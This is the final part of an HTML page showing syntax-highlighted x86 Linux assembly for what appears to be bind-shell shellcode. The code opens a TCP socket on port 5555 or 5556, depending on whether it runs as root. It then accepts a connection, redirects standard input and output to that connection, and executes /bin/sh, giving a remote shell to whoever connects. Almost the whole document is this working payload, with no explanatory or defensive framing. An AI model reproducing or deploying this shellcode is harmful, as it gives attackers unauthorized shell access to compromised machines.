</span><span class="sc1">;socket(family, type, proto)</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sys_socket</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">              </span><span class="sc1">; 0=IP</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">              </span><span class="sc1">; 1=SOCK_STREAM</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; 2=AF_INET</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; 1 -&gt; socket</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">0x80</span><span class="sc0">

</span><span class="sc1">;bind(socket, addr, lenng)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cdq</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0xB315</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sys_getuid</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">0x80</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;if uid != 0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">binduser</span><span class="sc0">        </span><span class="sc1">;goto binduser</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">binduser</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">         </span><span class="sc1">; port = 5556 if uid(0) else port =  5555</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">              </span><span class="sc1">; (0002 = AF_INET)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">        </span><span class="sc1">; ecx = offset sockaddr struct</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">         </span><span class="sc1">; len</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; push offset sockaddr struct</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; handle socket</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sys_socket</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">0x80</span><span class="sc0">

</span><span class="sc1">;If bind fail the process send to himself a SIGKILL</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">listen</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sys_getpid</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">0x80</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SIGKILL</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sys_kill</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">0x80</span><span class="sc0">

</span><span class="sc1">;listen(socket, backlog)</span><span class="sc0">
</span><span class="sc5">listen</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sys_socket</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LISTEN</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">0x80</span><span class="sc0">

</span><span class="sc1">;accept(socket, addr, len)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; 5 -&gt; accept</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sys_socket</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">0x80</span><span class="sc0">

</span><span class="sc1">;dup2()</span><span class="sc0">
</span><span class="sc9">dup</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sys_dup2</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">0x80</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc9">dup</span><span class="sc0">

</span><span class="sc1">;execve /bin/sh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sys_exec</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0x68732f6e</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0x69622f2f</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">0x80</span><span class="sc0">

</span><span class="sc5">fin_code</span><span class="sc4">:</span><span class="sc0">
</span></div></body>
</html>
